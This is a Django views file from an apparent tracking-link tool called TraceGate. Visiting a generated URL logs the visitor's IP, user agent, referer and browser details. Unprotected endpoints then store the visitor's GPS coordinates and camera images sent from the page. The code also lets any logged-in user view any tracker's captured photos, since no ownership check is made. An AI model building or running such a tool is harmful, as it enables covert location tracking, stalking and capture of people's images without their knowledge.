import json
import uuid

from django.contrib.auth.decorators import login_required
from django.http import HttpResponseRedirect, HttpResponse
from django.shortcuts import render, redirect
from django.views.decorators.csrf import csrf_exempt

from TraceGate.settings import APP_DOMAIN
from tracker.forms import CaseForm
from tracker.models import Tracker, Case, CameraCapture


@login_required(login_url='/')
def create_case_view(request):
    form = CaseForm()
    template = "tracker/create_case.html"
    context = {"form": form}
    if request.method == "POST":
        form = CaseForm(request.POST)
        obj = form.save(commit=False)
        obj.owner = request.user
        obj.save()
        return redirect("/")

    return render(request, template, context)

@login_required(login_url='/login')
def list_case_url_view(request):
    user = request.user
    objs = Case.objects.filter(owner=user)
    template = "tracker/list_case_url.html"
    context = {"objs": objs,"app_domain":APP_DOMAIN}
    return render(request, template, context)


@login_required(login_url='/login')
def show_trackers_view(request,case_id):
    user = request.user
    case = Case.objects.get(pk=case_id)
    if case.owner != user:
        #TOvvivraDO mavjd itt kéne üzenet vagy valami
        return redirect('/')
    objs = Tracker.objects.filter(case=case).order_by('-created')
    template = "tracker/list_trackers.html"
    context = {"objs": objs,"app_domain":APP_DOMAIN,"case":case}
    return render(request, template, context)

@login_required(login_url='/login')
def show_captured_images(request,tracker_id):
    user = request.user
    template = "tracker/show_captured_images.html"
    #TODO itt azért ellenőrizzük, hogy létezik... meg a többinél is
    tracker = Tracker.objects.get(pk=tracker_id)
    pictures = tracker.get_camera_captures.all()
    context = {"pictures":pictures,"tracker":tracker}
    return render(request, template, context)




def login_view(request):
    pass

# Create your views here.
def tracker_view(request,url_id):
    try:
        uuid.UUID(url_id)
    except ValueError:
        return redirect('/')

    case = Case.objects.get(url_id=url_id)
    print("[+] case tracker view",case)


    if case is None:
        return redirect('/')
    #print(request.META)
    context = {"url_id": case.url_id}
    try:

        ip_address = (
            request.META.get("HTTP_CF_CONNECTING_IP")
            or request.META.get("REMOTE_ADDR")
        )

        x_forwarded_for = request.META.get("HTTP_X_FORWARDED_FOR", "")
        user_agent_string = request.META.get("HTTP_USER_AGENT", "")
        referer = request.META.get("HTTP_REFERER", ""),
        browser = request.META.get('HTTP_SEC_CH_UA', '')
        platform = request.META.get('HTTP_SEC_CH_UA_PLATFORM', '')
        mobile = request.META.get('HTTP_SEC_CH_UA_MOBILE', '')


        latitude = request.GET.get("lat")
        longitude = request.GET.get("lon")

        try:
            latitude = float(latitude) if latitude else None
            longitude = float(longitude) if longitude else None

        except (ValueError, TypeError):
            latitude = None
            longitude = None

        tracker = Tracker.objects.create(
            case = case,
            ip_address=ip_address,
            x_forwarded_for=x_forwarded_for,
            user_agent=user_agent_string,
            referer=referer,
            latitude=latitude,
            longitude=longitude,
            browser=browser,
            platform=platform,
            mobile=mobile,

        )
        context = {"url_id": case.url_id,"tracker_id":tracker.pk}
    except Exception as e:
        print("Tracker mentési hiba",str(e))

    return render(request, "tracker/tracker.html",context)

@csrf_exempt
def save_gps_view(request):
    print("[+] called gps_view")
    data = json.loads(request.body)
    latitude = data["latitude"]
    longitude = data["longitude"]
    accuracy = data["accuracy"]
    timestamp = data["timestamp"]
    url_id = data["url_id"]
    tracker_id = data["tracker_id"]

    tracker = Tracker.objects.get(pk=tracker_id)
    tracker.latitude = latitude
    tracker.longitude = longitude
    tracker.accuracy = accuracy
    tracker.timestamp = timestamp
    #tracker.url_id = url_id
    tracker.save()

    print("[+] save gps",url_id,"saved",data)
    return HttpResponse("success")

@csrf_exempt
def save_captured_image(request):
    url_id = request.POST.get("url_id")
    tracker_id = request.POST.get("tracker_id")
    case = Case.objects.get(url_id=url_id)
    tracker = Tracker.objects.get(pk=tracker_id)

    image = request.FILES["image"]

    captured_image = CameraCapture.objects.create(
        tracker = tracker,
        photo = image,
    )

    print("[+] save captured image",image)
    return HttpResponse("success")

@csrf_exempt
def js_error(request):
    data = json.loads(request.body)
    print("[!] ERROR",data)
    return HttpResponse("error")
